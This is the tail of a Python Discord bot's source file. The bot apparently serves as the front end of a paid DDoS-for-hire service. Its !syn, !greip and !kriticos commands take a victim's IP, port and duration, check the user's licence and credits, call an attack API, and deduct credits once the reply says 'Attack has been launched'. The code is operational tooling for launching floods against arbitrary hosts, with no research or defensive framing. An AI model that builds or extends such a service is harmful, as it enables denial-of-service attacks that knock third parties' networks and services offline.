                    await message.reply(embed=embed)

                break

        if not found_user:
          embed = discord.Embed(
          title="__Information__",
          description=f"`You do not have access to this command.`",
          color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)


    if message.content.startswith('!syn'):
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True
                duration = license_info['duration']
                cooldown = license_info['cooldown']
                concurrents = license_info['concurrents']
                credits = license_info['credits']
                args = message.content.split()[1:]
                if len(args) == 3:
                  ip, port, atime = args
                  ppx = int(duration) + 1
                  if (int(atime) < ppx):

                    if credits > 4:

                      call = call_api("syn", ip, int(port), int(atime))
                      
                      txtcon = f"```Method: syn\nHost: {ip}\nPort: {port}\nDuration: {atime}\nFull Command: !syn {ip} {port} {atime}\nAPI Response: {call}\n\n"

                      if call == "Attack has been launched":
                        pppppa = deduct_credits(auth)
                        txtcon += f"5 credits have been deducted from your user. You now have {pppppa} credits.```"
                      else:
                        txtcon += f"Looks like there's an error. 5 credits have not been deducted from your user.```"


                      embed = discord.Embed(
                      title="__Information__",
                      description=f"{txtcon}",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                    else:
                      embed = discord.Embed(
                      title="__Information__",
                      description=f"`You do not have enough credits.`",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                  else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`You can only send attacks with a maximum time of {duration} seconds.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`Incorrect usage, try the !help command.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)

                break

        if not found_user:
          embed = discord.Embed(
          title="__Information__",
          description=f"`You do not have access to this command.`",
          color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)

    if message.content.startswith('!greip'):
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True
                duration = license_info['duration']
                cooldown = license_info['cooldown']
                concurrents = license_info['concurrents']
                credits = license_info['credits']
                args = message.content.split()[1:]
                if len(args) == 3:
                  ip, port, atime = args
                  ppx = int(duration) + 1
                  if (int(atime) < ppx):

                    if credits > 4:

                      call = call_api("greip", ip, int(port), int(atime))
                      
                      txtcon = f"```Method: greip\nHost: {ip}\nPort: {port}\nDuration: {atime}\nFull Command: !greip {ip} {port} {atime}\nAPI Response: {call}\n\n"

                      if call == "Attack has been launched":
                        pppppa = deduct_credits(auth)
                        txtcon += f"5 credits have been deducted from your user. You now have {pppppa} credits.```"
                      else:
                        txtcon += f"Looks like there's an error. 5 credits have not been deducted from your user.```"


                      embed = discord.Embed(
                      title="__Information__",
                      description=f"{txtcon}",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                    else:
                      embed = discord.Embed(
                      title="__Information__",
                      description=f"`You do not have enough credits.`",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                  else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`You can only send attacks with a maximum time of {duration} seconds.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`Incorrect usage, try the !help command.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)

                break

        if not found_user:
          embed = discord.Embed(
          title="__Information__",
          description=f"`You do not have access to this command.`",
          color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)


    if message.content.startswith('!kriticos'):
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True
                duration = license_info['duration']
                cooldown = license_info['cooldown']
                concurrents = license_info['concurrents']
                credits = license_info['credits']
                args = message.content.split()[1:]
                if len(args) == 3:
                  ip, port, atime = args
                  ppx = int(duration) + 1
                  if (int(atime) < ppx):

                    if credits > 4:

                      call = call_api("kriticos", ip, int(port), int(atime))
                      
                      txtcon = f"```Method: kriticos\nHost: {ip}\nPort: {port}\nDuration: {atime}\nFull Command: !kriticos {ip} {port} {atime}\nAPI Response: {call}\n\n"

                      if call == "Attack has been launched":
                        pppppa = deduct_credits(auth)
                        txtcon += f"5 credits have been deducted from your user. You now have {pppppa} credits.```"
                      else:
                        txtcon += f"Looks like there's an error. 5 credits have not been deducted from your user.```"


                      embed = discord.Embed(
                      title="__Information__",
                      description=f"{txtcon}",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                    else:
                      embed = discord.Embed(
                      title="__Information__",
                      description=f"`You do not have enough credits.`",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                  else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`You can only send attacks with a maximum time of {duration} seconds.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`Incorrect usage, try the !help command.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)

                break

        if not found_user:
          embed = discord.Embed(
          title="__Information__",
          description=f"`You do not have access to this command.`",
          color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)
        
client.run(token)
